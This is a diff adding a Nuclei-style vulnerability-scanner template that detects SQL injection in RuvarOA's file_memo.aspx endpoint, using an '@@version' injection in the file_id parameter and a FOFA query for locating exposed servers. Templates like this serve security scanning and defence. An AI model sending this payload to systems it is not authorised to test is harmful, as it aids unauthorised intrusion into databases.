@@ -1,0 +1,26 @@
+id: RuvarOA-filememo-SQL
+
+info:
+  name: RuvarOA-filememo-SQL
+  author: lengmo
+  severity: high
+  description: RuvarOA-filememo-SQL
+  tags: sqli
+  metadata:
+    fofa-qeury: body="txt_admin_key"
+    veified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        GET /filemanage/file_memo.aspx?file_id=@@version HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5807.225 Safari/537.36 Edg/112.0.1791.33
+        Connection: close
+
+               
+    matchers:     
+      - type: dsl
+        dsl:
+          - "status_code == 500 && contains(body,'Microsoft SQL Server')" 
